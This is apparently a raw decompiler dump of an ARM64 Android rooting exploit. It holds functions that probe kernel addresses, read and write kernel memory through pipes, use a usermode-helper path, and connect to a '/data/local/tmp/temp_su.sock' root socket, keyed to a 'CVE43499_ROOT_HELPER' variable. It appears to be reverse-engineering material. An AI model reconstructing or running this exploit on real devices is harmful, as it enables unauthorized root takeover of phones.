        if (DAT_0010daa0 != 0) {
          FUN_00108eec();
          lVar3 = FUN_00108ea4();
          if ((lVar3 == 0x28) && (lVar3 = FUN_00107058(param_3 & 0xffffffff), lVar3 == 0x28)) {
            lVar3 = __read_chk(*unaff_x23);
            bVar2 = lVar3 == 0x10d000;
            uVar1 = bVar2;
            FUN_00107058(param_3 & 0xffffffff);
          }
          else {
            uVar1 = 0;
            bVar2 = false;
          }
          FUN_00107370(*(undefined8 *)(unaff_x25 + 0x28));
          if ((bool)uVar1) {
            uVar4 = FUN_00108f5c(bVar2);
            return uVar4;
          }
                    /* WARNING: Subroutine does not return */
          __stack_chk_fail();
        }
        FUN_00108604(auVar5._0_8_,auVar5._8_8_,param_4);
        FUN_00108f10();
        lVar3 = __read_chk(*(undefined4 *)(extraout_x8_00 + 0x878));
        uVar4 = (ulong)(lVar3 == unaff_x19);
      }
      else {
        uVar4 = 0;
      }
    }
  }
  return uVar4 & 0xffffffff;
}



// ==== FUN_00108774 @ 00108774 size=396 ====

ulong FUN_00108774(undefined8 param_1,undefined8 param_2,ulong param_3,ulong param_4)

{
  undefined1 in_ZR;
  undefined1 uVar1;
  bool bVar2;
  long lVar3;
  ulong uVar4;
  ulong extraout_x8;
  long extraout_x8_00;
  long unaff_x19;
  long unaff_x23;
  long unaff_x25;
  undefined1 auVar5 [16];
  
  FUN_00108f84();
  uVar4 = 0;
  if ((bool)in_ZR) {
    auVar5 = FUN_00108f70();
    uVar4 = extraout_x8;
    if ((auVar5._8_8_ != 0) && (-1 < DAT_0010d710)) {
      if ((param_4 & 0xfff) + unaff_x19 < 0x1001) {
        if (DAT_0010daa0 != 0) {
          FUN_00108eec();
          lVar3 = FUN_00108ea4();
          uVar1 = lVar3 == 0x28;
          if ((bool)uVar1) {
            lVar3 = FUN_00107058(param_3 & 0xffffffff);
            bVar2 = false;
            uVar1 = 0;
            if (lVar3 == 0x28) {
              lVar3 = __write_chk(*(undefined4 *)(unaff_x23 + 4));
              bVar2 = lVar3 == 0x10d000;
              uVar1 = bVar2;
              FUN_00107058(param_3 & 0xffffffff);
            }
          }
          else {
            bVar2 = false;
          }
          FUN_00107370(*(undefined8 *)(unaff_x25 + 0x28));
          if ((bool)uVar1) {
            uVar4 = FUN_00108f5c(bVar2);
            return uVar4;
          }
                    /* WARNING: Subroutine does not return */
          __stack_chk_fail();
        }
        FUN_00108604(auVar5._0_8_,auVar5._8_8_,param_4);
        FUN_00108f10();
        lVar3 = __write_chk(*(undefined4 *)(extraout_x8_00 + 0x87c));
        uVar4 = (ulong)(lVar3 == unaff_x19);
      }
      else {
        uVar4 = 0;
      }
    }
  }
  return uVar4 & 0xffffffff;
}



// ==== FUN_00108808 @ 00108808 size=1692 ====

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_00108808(undefined4 param_1)

{
  int iVar1;
  long lVar2;
  undefined1 auVar3 [16];
  undefined1 auVar4 [16];
  undefined1 auVar5 [16];
  undefined1 auVar6 [16];
  undefined1 auVar7 [16];
  undefined1 auVar8 [16];
  undefined1 auVar9 [16];
  undefined1 auVar10 [16];
  ulong uVar11;
  int iVar12;
  uint uVar13;
  ulong uVar14;
  undefined8 uVar15;
  long lVar16;
  long lVar17;
  ssize_t sVar18;
  undefined4 *puVar19;
  ulong uVar20;
  undefined8 extraout_x8;
  undefined8 extraout_x8_00;
  int iVar21;
  int iVar22;
  uint uVar23;
  ulong uVar24;
  ulong uVar25;
  undefined1 auVar26 [16];
  undefined1 auVar27 [16];
  long local_81b8;
  undefined1 local_81ac [4];
  long local_81a8;
  undefined8 local_81a0;
  undefined7 uStack_8198;
  undefined1 uStack_8191;
  undefined7 uStack_8190;
  undefined8 local_8180;
  undefined7 uStack_8178;
  undefined1 uStack_8171;
  undefined7 uStack_8170;
  undefined1 auStack_8160 [240];
  ulong local_8070;
  int local_8068;
  int local_8064;
  undefined8 local_8060;
  int local_8058 [2];
  long local_8050;
  long alStack_8048 [6];
  long local_8018;
  long local_7f38;
  long local_70;
  
  lVar2 = tpidr_el0;
  local_70 = *(long *)(lVar2 + 0x28);
  if (DAT_0010dae0 == 0) {
    DAT_0010d774 = 0;
    DAT_0010d770 = 1;
    while (DAT_0010d774 == 0) {
      usleep(10000);
    }
  }
  uVar11 = DAT_0010d978;
  if (((DAT_0010d978 & 0xfffffffffffff000) + 0x7000 != (DAT_0010d978 + 0x7000 & 0xfffffffffffff000))
     || (DAT_0010dae0 >> 0x24 != 0xffffff8)) {
LAB_00108e68:
    uVar13 = 0;
    goto LAB_00108e6c;
  }
  memset(&local_8070,0,0x1c0);
  lVar16 = DAT_0010d9a8 + -0x7fd5f9b988;
  if (DAT_0010da48 != 0) {
    lVar16 = DAT_0010da68 + 0x2064478;
  }
  FUN_00107138(param_1,lVar16,&local_8070,0x1c0);
  lVar16 = DAT_0010d9a8 + -0x7fd5f9b850;
  if (DAT_0010da48 != 0) {
    lVar16 = DAT_0010da68 + 0x20645b0;
  }
  DAT_0010dac0 = local_8018;
  DAT_0010dac8 = local_7f38;
  FUN_00107248(param_1,lVar16);
  uVar25 = 0;
  do {
    uVar24 = DAT_0010dae0;
    if (0x7fff < uVar25) {
      DAT_0010da88 = 0;
      uVar13 = 0;
      goto LAB_00108e6c;
    }
    uVar20 = uVar25 + 0x8000000000 + DAT_0010dae0 >> 6 & 0x3ffffffffffffc0;
    uVar14 = FUN_00107248(param_1,uVar20 - 0x1fffffff8);
    uVar20 = uVar20 - 0x200000000;
    if ((uVar14 & 1) != 0) {
      uVar20 = uVar14 & 0xfffffffffffffffe;
    }
    uVar15 = FUN_00107248(param_1,uVar20 + 8);
    uVar15 = FUN_00108f40(uVar15,uVar20 + 0x10);
    uVar15 = FUN_00108f40(uVar15,uVar20 + 0x18);
    uVar15 = FUN_00108f40(uVar15,uVar20 + 0x20);
    lVar16 = FUN_00108f40(uVar15,uVar20 + 0x18);
    FUN_00108f40(lVar16,uVar20 + 0x30);
    uVar25 = uVar25 + 0x1000;
  } while (lVar16 == 0 || DAT_0010dac0 != lVar16 && DAT_0010dac8 != lVar16);
  DAT_0010dae0 = (uVar24 + uVar25) - 0x1000;
  lVar16 = 1;
  DAT_0010da88 = 1;
  memset(auStack_8160,0x61,0xf0);
  puVar19 = &DAT_0010e2ec;
  while (uVar25 = DAT_0010dae0, lVar16 != 0xf1) {
    lVar17 = __write_chk(*puVar19,auStack_8160,lVar16,0xf0);
    lVar16 = lVar16 + 1;
    puVar19 = puVar19 + 2;
    if (lVar17 == -1) {
      FUN_001048f8();
                    /* WARNING: Subroutine does not return */
      FUN_00104934();
    }
  }
  uVar24 = 0;
  DAT_0010daa0 = 0;
  DAT_0010d710 = 0xffffffff;
  DAT_0010dab0 = 0;
  DAT_0010daa8 = 0;
  DAT_0010dab8 = 0;
  DAT_0010da74 = 0;
  _DAT_0010da7c = 0;
  DAT_0010da84 = 0;
  DAT_0010dad0 = 0;
  do {
    if (0x7fff < uVar24) {
      lVar16 = -0x3ff61809a0;
      if (DAT_0010da48 != 0) {
        lVar16 = DAT_0010da68 + 0x1e7f460;
      }
      uVar24 = 0xfffffffffffffff8;
      uVar20 = DAT_0010dad0;
      iVar22 = DAT_0010da84;
      iVar12 = DAT_0010da7c;
      iVar21 = DAT_0010da80;
      goto LAB_00108b30;
    }
    lVar16 = FUN_00107138(param_1,uVar25 + uVar24,(long)&local_8070 + uVar24,0x400);
    uVar24 = uVar24 + 0x400;
  } while (lVar16 == 0x400);
  goto LAB_00108bb4;
  while (uVar24 = uVar24 + 8, uVar24 < 0x7fd1) {
LAB_00108b30:
    uVar14 = *(ulong *)((long)&local_8068 + uVar24);
    if (uVar14 >> 0x1e == 0x3fffffff8) {
      iVar1 = *(int *)((long)local_8058 + (uVar24 - 4));
      iVar12 = iVar12 + 1;
      if (uVar20 == 0) {
        uVar20 = uVar14;
        DAT_0010dad0 = uVar14;
      }
      if (*(long *)((long)local_8058 + uVar24) == lVar16) {
        iVar21 = iVar21 + 1;
        DAT_0010da80 = iVar21;
      }
      _DAT_0010da7c = CONCAT44(DAT_0010da80,iVar12);
      uVar13 = iVar1 - 1;
      if (uVar13 < 0xf0) {
        iVar22 = iVar22 + 1;
        DAT_0010da84 = iVar22;
      }
      if ((((*(int *)((long)local_8058 + (uVar24 - 8)) == 0) &&
           (*(long *)((long)local_8058 + uVar24) == lVar16 &&
            *(int *)((long)alStack_8048 + (uVar24 - 8)) == 0x10)) &&
          (*(long *)((long)alStack_8048 + uVar24) == 0)) && (0xffffff0f < iVar1 - 0xf1U)) {
        DAT_0010daa0 = uVar25 + uVar24 + 8;
        DAT_0010dab8 = 0;
        DAT_0010da74 = CONCAT44(0x10,iVar1);
        if (DAT_0010da88 == 0) {
          DAT_0010da88 = 2;
        }
        local_81ac[0] = 0x6c;
        DAT_0010d710 = uVar13;
        DAT_0010daa8 = uVar14;
        DAT_0010dab0 = lVar16;
        sVar18 = write((&DAT_0010e2ec)[(long)(int)uVar13 * 2],local_81ac,1);
        auVar27 = FUN_00107138(param_1,DAT_0010daa0,&local_8070,0x28);
        auVar10._8_8_ = DAT_0010db18_8;
        auVar10._0_8_ = _DAT_0010db18;
        auVar9._8_8_ = DAT_0010db18_8;
        auVar9._0_8_ = _DAT_0010db18;
        auVar8._8_8_ = DAT_0010db18_8;
        auVar8._0_8_ = _DAT_0010db18;
        auVar7._8_8_ = DAT_0010db08_8;
        auVar7._0_8_ = _DAT_0010db08;
        auVar6._8_8_ = DAT_0010db08_8;
        auVar6._0_8_ = _DAT_0010db08;
        auVar5._8_8_ = DAT_0010db08_8;
        auVar5._0_8_ = _DAT_0010db08;
        auVar4._8_8_ = DAT_0010daf8_8;
        auVar4._0_8_ = _DAT_0010daf8;
        auVar3._8_8_ = DAT_0010daf8_8;
        auVar3._0_8_ = _DAT_0010daf8;
        auVar26._8_8_ = DAT_0010daf8_8;
        auVar26._0_8_ = _DAT_0010daf8;
        uVar13 = 0;
        if (((sVar18 != 1) ||
            (_DAT_0010daf8 = auVar26, _DAT_0010db08 = auVar5, _DAT_0010db18 = auVar8,
            auVar27._0_8_ != 0x28)) ||
           ((uVar13 = 0, _DAT_0010daf8 = auVar3, _DAT_0010db08 = auVar6, _DAT_0010db18 = auVar9,
            local_8070 != DAT_0010daa8 ||
            (_DAT_0010daf8 = auVar4, _DAT_0010db08 = auVar7, _DAT_0010db18 = auVar10,
            local_8068 != 0)))) goto LAB_00108e6c;
        if (((local_8064 != (int)DAT_0010da74 + 1) || (local_8060 != DAT_0010dab0)) ||
           ((local_8058[0] != DAT_0010da74._4_4_ || (local_8050 != DAT_0010dab8))))
        goto LAB_00108e68;
        auVar26 = FUN_00108f30(CONCAT71(s_3727730_00101efa._1_7_,s_3727730_00101efa[0]),
                               _DAT_00101eeb,0,auVar27._8_8_,&local_8180);
        local_8180 = auVar26._0_8_;
        uStack_8178 = auVar26._8_7_;
        uStack_8171 = (undefined1)extraout_x8;
        uStack_8170 = (undefined7)((ulong)extraout_x8 >> 8);
        lVar16 = FUN_00107058();
        if (lVar16 != 0x17) goto LAB_00108e68;
        puVar19 = &DAT_0010da8c;
        _DAT_0010daf8 = FUN_00108f30(0);
        _DAT_0010db08 = _DAT_0010daf8;
        _DAT_0010db18 = _DAT_0010daf8;
        *(undefined1 (*) [16])(puVar19 + 0x17) = _DAT_0010daf8;
        auVar26 = FUN_001086e0();
        DAT_0010da8c = auVar26._0_4_;
        auVar26 = FUN_00108f30(CONCAT71(s_3727731_00101e2d._1_7_,s_3727731_00101e2d[0]),
                               _DAT_00101e1e,auVar26._0_8_,auVar26._8_8_,&local_81a0);
        local_81a0 = auVar26._0_8_;
        uStack_8198 = auVar26._8_7_;
        uStack_8191 = (undefined1)extraout_x8_00;
        uStack_8190 = (undefined7)((ulong)extraout_x8_00 >> 8);
        auVar26 = FUN_00108774();
        DAT_0010da90 = auVar26._0_4_;
        FUN_00108f30(auVar26._0_8_,auVar26._8_8_,&DAT_0010db28);
        FUN_00107138();
        local_81b8 = 0x306365737562656e;
        FUN_00107058(param_1,uVar11 + 0x7100,&local_81b8,8);
        local_81a8 = 0;
        FUN_001086e0(param_1,uVar11 + 0x7100,&local_81a8,8);
        DAT_0010da94 = (uint)(local_81a8 == local_81b8);
        local_81a8 = 0x316365737562656e;
        DAT_0010da98 = FUN_00108774(param_1,uVar11 + 0x7100,&local_81a8,8);
        FUN_00107138(param_1,uVar11 + 0x7100,&DAT_0010dad8,8);
        uVar23 = (uint)(DAT_0010da98 != 0 && DAT_0010dad8 == 0x316365737562656e);
        DAT_0010da98 = uVar23;
        if (DAT_0010da8c != 0) {
          iVar12 = memcmp(&DAT_0010dae8,&local_8180,0x17);
          uVar13 = 0;
          if ((iVar12 == 0) && (DAT_0010da90 != 0)) {
            iVar12 = memcmp(&DAT_0010db28,&local_81a0,0x17);
            uVar13 = uVar23;
            if (DAT_0010da94 == 0 || iVar12 != 0) {
              uVar13 = 0;
            }
          }
          goto LAB_00108e6c;
        }
        break;
      }
    }
  }
LAB_00108bb4:
  uVar13 = 0;
LAB_00108e6c:
  if (*(long *)(lVar2 + 0x28) == local_70) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail(uVar13);
}



// ==== FUN_00108ea4 @ 00108ea4 size=72 ====

void FUN_00108ea4(undefined4 param_1,undefined8 param_2,undefined8 param_3)

{
  long lVar1;
  undefined8 uStack0000000000000058;
  
  lVar1 = tpidr_el0;
  uStack0000000000000058 = *(undefined8 *)(lVar1 + 0x28);
  FUN_00107138(param_1,param_3,&stack0x00000030,0x28);
  return;
}



// ==== FUN_00108eec @ 00108eec size=36 ====

void FUN_00108eec(void)

{
  return;
}



// ==== FUN_00108f10 @ 00108f10 size=32 ====

void FUN_00108f10(void)

{
  return;
}



// ==== FUN_00108f30 @ 00108f30 size=16 ====

undefined4 FUN_00108f30(void)

{
  undefined4 unaff_w19;
  
  return unaff_w19;
}



// ==== FUN_00108f40 @ 00108f40 size=8 ====

void FUN_00108f40(void)

{
  undefined4 unaff_w19;
  
  FUN_00107248(unaff_w19);
  return;
}



// ==== FUN_00108f48 @ 00108f48 size=12 ====

__pid_t FUN_00108f48(__pid_t param_1)

{
  __pid_t _Var1;
  
  _Var1 = waitpid(param_1,(int *)0x0,0);
  return _Var1;
}



// ==== FUN_00108f54 @ 00108f54 size=8 ====

void FUN_00108f54(void)

{
  undefined4 *unaff_x25;
  
  FUN_00106008(*unaff_x25);
  return;
}



// ==== FUN_00108f5c @ 00108f5c size=20 ====

void FUN_00108f5c(void)

{
  return;
}



// ==== FUN_00108f70 @ 00108f70 size=20 ====

void FUN_00108f70(void)

{
  return;
}



// ==== FUN_00108f84 @ 00108f84 size=20 ====

void FUN_00108f84(void)

{
  return;
}



// ==== FUN_00108f98 @ 00108f98 size=12 ====

void FUN_00108f98(void)

{
  return;
}



// ==== FUN_00108fa4 @ 00108fa4 size=1524 ====

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 FUN_00108fa4(undefined4 param_1)

{
  long lVar1;
  long lVar2;
  long lVar3;
  bool bVar4;
  long lVar5;
  undefined4 uVar6;
  bool bVar7;
  bool bVar8;
  int iVar9;
  __uid_t _Var10;
  uint uVar11;
  int iVar12;
  int iVar13;
  char *pcVar14;
  long lVar15;
  ulong uVar16;
  ulong uVar17;
  ulong uVar18;
  ulong uVar19;
  long lVar20;
  long lVar21;
  undefined8 uVar22;
  undefined8 uVar23;
  undefined8 *puVar24;
  undefined4 uVar25;
  ulong uVar26;
  long lVar27;
  undefined1 local_2cc [4];
  ulong local_2c8;
  long lStack_2c0;
  long local_2b8;
  long lStack_2b0;
  undefined8 local_2a8;
  undefined8 uStack_2a0;
  long local_298;
  long lStack_290;
  long local_288;
  long lStack_280;
  undefined8 local_278;
  undefined8 uStack_270;
  undefined8 local_268;
  undefined8 uStack_260;
  undefined1 auStack_258 [16];
  long local_248;
  long lStack_240;
  undefined1 auStack_238 [256];
  undefined1 auStack_138 [16];
  undefined1 auStack_128 [16];
  long local_118;
  long lStack_110;
  long local_108;
  undefined8 local_100;
  undefined8 uStack_f8;
  sockaddr local_f0 [8];
  long local_70;
  
  lVar3 = tpidr_el0;
  local_70 = *(long *)(lVar3 + 0x28);
  getuid();
  lVar5 = DAT_0010d978;
  lVar15 = DAT_0010d9a8 + -0x7fd5271a40;
  if (DAT_0010da48 != 0) {
    lVar15 = DAT_0010da68 + 0x2d8e5c0;
  }
  local_2cc[0] = 0;
  memset(auStack_258,0,0x168);
  pcVar14 = getenv("CVE43499_ROOT_HELPER");
  if (((pcVar14 == (char *)0x0) || (*pcVar14 != '/')) ||
     (iVar9 = FUN_00109598(auStack_238,0x100,0x100,&DAT_00101e8f,pcVar14), 0xff < iVar9)) {
LAB_0010956c:
    fwrite(&DAT_00102155,0x1e,1,*(FILE **)PTR_stderr_0010c2c8);
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  FUN_00109598(auStack_138,0x10,0x10,&DAT_00101e8f,"--umh");
  _Var10 = getuid();
  FUN_00109598(auStack_128,0x10,0x10,&DAT_001020be,_Var10);
  local_248 = lVar5 + 0x6210;
  lVar27 = lVar5 + _DAT_001022b0;
  lStack_110 = lVar5 + _UNK_001022b8;
  local_108 = lVar5 + 0x6330;
  local_100 = 0;
  uStack_f8 = 0;
  lVar2 = -0x3ff7efba30;
  if (DAT_0010da48 != 0) {
    lVar2 = DAT_0010da68 + 0x1045d0;
  }
  lStack_240 = local_248;
  local_118 = lVar27;
  unlink("/data/local/tmp/temp_su.sock");
  lVar15 = FUN_00107058(param_1,lVar15,local_2cc,1);
  if (lVar15 != 1) goto LAB_0010956c;
  lVar15 = DAT_0010d9a8 + -0x7fd556f800;
  if (DAT_0010da48 != 0) {
    lVar15 = DAT_0010da68 + 0x2a90800;
  }
  uVar16 = FUN_00107248(param_1,lVar15);
  uVar17 = FUN_001096e8(uVar16,uVar16 + 0xb0);
  uVar18 = FUN_0010963c(param_1,uVar17);
  uVar19 = FUN_001096e8(uVar18,uVar17 + 8);
  if ((uVar16 >> 0x24 != 0xffffff8 || (uVar17 & 0xfffffff000000000) != 0xffffff8000000000) ||
     (uVar18 >> 0x24 != 0xffffff8 || uVar19 != uVar16)) goto LAB_0010956c;
  lVar1 = lVar5 + 0x6200;
  lVar15 = uVar18 + 0x20;
  iVar9 = 200;
  do {
    lVar20 = FUN_0010963c(param_1,lVar15);
    lVar21 = FUN_001096e8(lVar20,uVar18 + 0x28);
    uVar16 = FUN_001096e8(lVar21,uVar18 + 0x34);
    if ((lVar20 == lVar15 && lVar21 == lVar15) && ((int)uVar16 != 0)) {
      uVar26 = 1;
      uVar19 = uVar16;
      lVar21 = lVar15;
      goto LAB_00109248;
    }
    uVar11 = usleep(1000);
    iVar9 = iVar9 + -1;
  } while (iVar9 != 0);
  uVar19 = (ulong)uVar11;
  uVar26 = uVar16;
  if (lVar20 != lVar15) goto LAB_0010956c;
LAB_00109248:
  if ((lVar21 != lVar15) || ((int)uVar26 == 0)) goto LAB_0010956c;
  uVar16 = FUN_001096e8(uVar19,uVar17 + 0x10);
  uVar22 = FUN_001096e8(uVar16,uVar17 + 0x18);
  uVar23 = FUN_001096e8(uVar22,uVar17 + 0x5c);
  uVar11 = FUN_001096e8(uVar23,uVar17 + 0x60);
  if (((uVar16 & 0xfffffff0) != 0) || (((int)uVar22 == 0 || (uVar11 <= (uint)uVar23))))
  goto LAB_0010956c;
  lVar21 = uVar17 + (uVar16 & 0xffffffff) * 4;
  iVar9 = FUN_0010963c(param_1,lVar21 + 0x1c);
  local_2c8 = uVar17 | (uVar16 & 0xffffffff) << 4 | 5;
  uStack_260 = 0;
  local_268 = 0;
  uStack_270 = 0;
  local_278 = 0;
  uStack_2a0 = 0;
  local_2a8 = 0;
  lStack_2c0 = lVar15;
  local_2b8 = lVar15;
  lStack_2b0 = lVar2;
  local_298 = lVar1;
  lStack_290 = lVar27;
  local_288 = lVar5 + 0x6340;
  lStack_280 = lVar5 + 0x6360;
  iVar12 = FUN_00108774(param_1,lVar1,auStack_258,0x168);
  iVar13 = FUN_00108774(param_1,lVar5 + 0x6000,&local_2c8,0x70);
  iVar9 = FUN_00109688(param_1,lVar21 + 0x1c,iVar9 + 1);
  if ((iVar9 == 0) || (iVar9 = FUN_00109688(param_1,uVar17 + 0x5c,(uint)uVar23 + 1), iVar9 == 0)) {
    bVar7 = false;
  }
  else {
    iVar9 = FUN_00109688(param_1,uVar17 + 0x18,(int)uVar22 + 1);
    bVar7 = iVar9 != 0;
  }
  uVar16 = FUN_001096b8(param_1,uVar18 + 0x28,lVar5 + 0x6008);
  if ((int)uVar16 == 0) {
    bVar8 = false;
  }
  else {
    uVar16 = FUN_001096b8(param_1,lVar15,lVar5 + 0x6008);
    bVar8 = (int)uVar16 != 0;
  }
  uVar25 = 0;
  bVar4 = false;
  if (iVar12 != 0 && iVar13 != 0) {
    bVar4 = bVar7;
  }
  uVar6 = DAT_0010ea68;
  if ((!bVar4) || (!bVar8)) goto LAB_00109538;
  uVar11 = 0;
  do {
    iVar9 = posix_openpt(0x80102);
    if (-1 < iVar9) {
      iVar13 = grantpt(iVar9);
      iVar12 = iVar9;
      if (((iVar13 == 0) && (iVar13 = unlockpt(iVar9), iVar13 == 0)) &&
         (iVar13 = ptsname_r(iVar9,(char *)local_f0,0x80), iVar13 == 0)) {
        iVar12 = __open_2(local_f0,0x80102);
        close(iVar9);
        if (iVar12 < 0) goto LAB_00109440;
      }
      close(iVar12);
    }
LAB_00109440:
    iVar9 = 0xfa;
    do {
      iVar12 = FUN_0010963c(param_1,lVar1);
      if (iVar12 != 0) {
        FUN_00109718();
        iVar9 = 200;
        puVar24 = (undefined8 *)((ulong)local_f0 | 2);
        uVar25 = 1;
        goto LAB_001094ac;
      }
      iVar12 = usleep(1000);
      iVar9 = iVar9 + -1;
    } while (iVar9 != 0);
    bVar7 = uVar11 < 7;
    uVar11 = uVar11 + 1;
  } while (bVar7);
  uVar16 = FUN_00109718(iVar12);
  goto LAB_00109524;
LAB_001094ac:
  do {
    iVar12 = socket(1,0x80001,0);
    if (-1 < iVar12) {
      local_f0[0].sa_family = 1;
      *(undefined8 *)((long)puVar24 + 100) = 0;
      *(undefined8 *)((long)puVar24 + 0x5c) = 0;
      puVar24[1] = 0;
      *puVar24 = 0;
      puVar24[3] = 0;
      puVar24[2] = 0;
      puVar24[5] = 0;
      puVar24[4] = 0;
      puVar24[7] = 0;
      puVar24[6] = 0;
      puVar24[9] = 0;
      puVar24[8] = 0;
      puVar24[0xb] = 0;
      puVar24[10] = 0;
      FUN_00109598(puVar24,0x6c,0x6c,&DAT_00101e8f,"/data/local/tmp/temp_su.sock");
      iVar13 = connect(iVar12,local_f0,0x6e);
      uVar11 = close(iVar12);
      uVar16 = (ulong)uVar11;
      uVar6 = uVar25;
      if (iVar13 == 0) goto LAB_00109538;
    }
    uVar11 = usleep(10000);
    uVar16 = (ulong)uVar11;
    iVar9 = iVar9 + -1;
  } while (iVar9 != 0);
LAB_00109524:
  uVar25 = 0;
  uVar6 = uVar25;
LAB_00109538:
  DAT_0010ea68 = uVar6;
  if (*(long *)(lVar3 + 0x28) != local_70) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(uVar16);
  }
  return uVar25;
}



// ==== FUN_00109598 @ 00109598 size=164 ====

void FUN_00109598(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,
                 undefined8 param_5,undefined8 param_6,undefined8 param_7,undefined8 param_8,
                 undefined8 param_9)

{
  long lVar1;
  long lVar2;
  undefined8 local_90;
  undefined8 uStack_88;
  undefined8 local_80;
  undefined8 uStack_78;
  undefined1 *local_70;
  undefined1 **ppuStack_68;
  undefined8 *puStack_60;
  undefined8 uStack_58;
  
  puStack_60 = &local_90;
  lVar1 = tpidr_el0;
  lVar2 = *(long *)(lVar1 + 0x28);
  ppuStack_68 = &local_70;
  uStack_58 = 0xffffff80ffffffe0;
  local_90 = param_6;
  uStack_88 = param_7;
  local_80 = param_8;
  uStack_78 = param_9;
  local_70 = (undefined1 *)register0x00000008;
  __vsnprintf_chk(param_2,param_4,0,param_3,param_5,&local_70,param_8,param_9,param_1);
  if (*(long *)(lVar1 + 0x28) == lVar2) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



// ==== FUN_0010963c @ 0010963c size=76 ====

void FUN_0010963c(undefined8 param_1,undefined8 param_2)

{
  long lVar1;
  undefined1 in_ZR;
  undefined8 local_30;
  undefined8 local_28;
  
  lVar1 = tpidr_el0;
  local_28 = *(undefined8 *)(lVar1 + 0x28);
  local_30 = 0;
  FUN_001086e0(param_1,param_2,&local_30,8);
  FUN_00109708(local_30);
  if ((bool)in_ZR) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



// ==== FUN_00109688 @ 00109688 size=48 ====

void FUN_00109688(undefined8 param_1,undefined8 param_2,undefined4 param_3)

{
  undefined1 in_ZR;
  undefined1 auVar1 [16];
  undefined4 local_2c [3];
  
  local_2c[0] = param_3;
  auVar1 = FUN_001096f0();
  FUN_00108774(auVar1._0_8_,auVar1._8_8_,local_2c);
  FUN_00109708();
  if ((bool)in_ZR) {
    FUN_00109728();
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



// ==== FUN_001096b8 @ 001096b8 size=48 ====

void FUN_001096b8(undefined8 param_1,undefined8 param_2,undefined8 param_3)

{
  undefined1 in_ZR;
  undefined1 auVar1 [16];
  undefined8 local_30 [2];
  
  auVar1 = FUN_001096f0();
  local_30[0] = param_3;
  FUN_00108774(auVar1._0_8_,auVar1._8_8_,local_30);
  FUN_00109708();
  if ((bool)in_ZR) {
    FUN_00109728();
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



// ==== FUN_001096e8 @ 001096e8 size=8 ====

void FUN_001096e8(void)

{
  undefined4 unaff_w19;
  
  FUN_0010963c(unaff_w19);
  return;
}



// ==== FUN_001096f0 @ 001096f0 size=24 ====

void FUN_001096f0(void)

{
  undefined8 uVar1;
  
  uVar1 = tpidr_el0;
  return;
}



// ==== FUN_00109708 @ 00109708 size=16 ====

void FUN_00109708(void)

{
  return;
}



// ==== FUN_00109718 @ 00109718 size=16 ====

void FUN_00109718(void)

{
  undefined4 unaff_w19;
  long unaff_x25;
  
  FUN_0010963c(unaff_w19,unaff_x25 + 0x6054);
  return;
}



// ==== FUN_00109728 @ 00109728 size=12 ====

void FUN_00109728(void)

{
  return;
}



// ==== FUN_00109734 @ 00109734 size=2000 ====

/* WARNING: Removing unreachable block (ram,0x00109dc4) */

undefined4 FUN_00109734(void)

{
  byte *pbVar1;
  char cVar2;
  long lVar3;
  bool bVar4;
  bool bVar5;
  int iVar6;
  char *pcVar7;
  int *piVar8;
  ulong uVar9;
  char *pcVar10;
  char *pcVar11;
  char *__s2;
  char *__s2_00;
  void *pvVar12;
  long lVar13;
  code *pcVar14;
  longlong lVar15;
  time_t tVar16;
  code *pcVar17;
  code *pcVar18;
  code *pcVar19;
  code *pcVar20;
  code *pcVar21;
  code *pcVar22;
  long lVar23;
  long lVar24;
  size_t sVar25;
  undefined4 uVar26;
  long lVar27;
  char *local_2420;
  long local_2418;
  code *local_2410;
  code *local_2408;
  code *pcStack_2400;
  code *local_23f8;
  code *pcStack_23f0;
  code *local_23e8;
  code *pcStack_23e0;
  code *local_23d8;
  long local_23d0;
  long local_23c8;
  size_t local_23c0;
  void *local_23b8;
  undefined8 local_23b0;
  void *local_23a8;
  long local_23a0 [9];
  undefined8 local_2358;
  undefined1 local_2318;
  undefined1 auStack_2313 [65];
  undefined1 auStack_22d2 [65];
  char acStack_2291 [32];
  char acStack_2271 [257];
  char acStack_2170 [80];
  char acStack_2120 [80];
  char acStack_20d0 [32];
  undefined1 auStack_20b0 [64];
  undefined1 auStack_2070 [8192];
  long local_70;
  
  lVar3 = tpidr_el0;
  lVar27 = *(long *)(lVar3 + 0x28);
  pcVar7 = getenv("GRKU_PAYLOAD_FD");
  if ((pcVar7 == (char *)0x0) || (*pcVar7 == '\0')) {
LAB_00109798:
    if (*(long *)(lVar3 + 0x28) != lVar27) {
LAB_00109804:
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    uVar9 = 0xffffffff;
  }
  else {
    piVar8 = (int *)__errno();
    *piVar8 = 0;
    uVar9 = strtol(pcVar7,(char **)&stack0xffffffffffffffc0,10);
    if ((*piVar8 != 0) ||
       ((((pcVar7 == (char *)0x0 || (cRam0000000000000000 != '\0')) || ((long)uVar9 < 0)) ||
        (0x7fffffff < (long)uVar9)))) goto LAB_00109798;
    if (*(long *)(lVar3 + 0x28) != lVar27) goto LAB_00109804;
  }
  lVar3 = tpidr_el0;
  local_70 = *(long *)(lVar3 + 0x28);
  local_23c0 = 0;
  local_23b8 = (void *)0x0;
  local_23d0 = 0;
  local_23c8 = 0;
  pcVar7 = getenv("GRKU_TICKET_PATH");
  pcVar10 = getenv("GRKU_PAYLOAD_PATH");
  pcVar11 = getenv("GRKU_ROOT_PATH");
  __s2 = getenv("GRKU_PROFILE_ID");
  __s2_00 = getenv("GRKU_MODE");
  if (pcVar7 == (char *)0x0) {
    uVar26 = 0xffffffff;
    goto LAB_00109b20;
  }
  uVar26 = 0xffffffff;
  if (((__s2_00 == (char *)0x0) || (__s2 == (char *)0x0)) ||
     ((pcVar11 == (char *)0x0 || (pcVar10 == (char *)0x0 && (int)uVar9 < 0)))) goto LAB_00109b20;
  iVar6 = FUN_00109f28(pcVar7,0x2000,&local_23b8,&local_23c0);
  if (iVar6 == 0) {
    uVar26 = 0xfffffffe;
    goto LAB_00109b20;
  }
